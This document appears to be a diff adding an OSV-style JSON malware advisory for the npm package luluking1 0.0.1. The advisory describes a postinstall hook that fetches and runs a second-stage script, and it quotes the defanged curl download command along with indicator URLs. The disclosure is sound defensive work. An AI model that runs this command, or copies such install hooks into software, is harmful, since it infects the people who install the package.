@@ -1,0 +1,62 @@
+{
+  "schema_version": "1.6.0",
+  "id": "LWA-2026-7007",
+  "modified": "2026-07-22T02:20:45Z",
+  "published": "2026-07-22T02:20:23Z",
+  "summary": "Malicious code in luluking1 (npm)",
+  "details": "The postinstall hook runs index.js, which decodes a remote URL from character codes and executes `curl -sL -o \".cache\" \"hxxps://aone-kit[.]oss-cn-beijing[.]aliyuncs[.]com/plugins/crypto[.]js\"` to download a second-stage payload, then loads and executes it via require() before deleting the downloaded file. The package has no other functionality — its sole purpose is to fetch and run a remote script at install time from an Alibaba Cloud OSS bucket.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "luluking1",
+        "purl": "pkg:npm/luluking1@0.0.1"
+      },
+      "versions": [
+        "0.0.1"
+      ],
+      "database_specific": {
+        "cwes": [
+          {
+            "cweId": "CWE-506",
+            "name": "Embedded Malicious Code"
+          }
+        ],
+        "leitwacht": {}
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "PACKAGE",
+      "url": "https://www.npmjs.com/package/luluking1/v/0.0.1"
+    },
+    {
+      "type": "REPORT",
+      "url": "https://threatintel.leitwacht.eu/d/LWA-2026-7007"
+    }
+  ],
+  "credits": [
+    {
+      "name": "Leitwacht",
+      "type": "FINDER",
+      "contact": [
+        "https://threatintel.leitwacht.eu"
+      ]
+    }
+  ],
+  "database_specific": {
+    "leitwacht": {
+      "category": "malware",
+      "first_seen_at": "2026-07-22T02:20:23Z",
+      "indicators_observed": {
+        "domain_observed": [
+          "aone-kit[.]oss-cn-beijing[.]aliyuncs[.]com"
+        ],
+        "url_observed": [
+          "hxxps://aone-kit[.]oss-cn-beijing[.]aliyuncs[.]com/plugins/crypto[.]js"
+        ]
+      }
+    }
+  }
+}
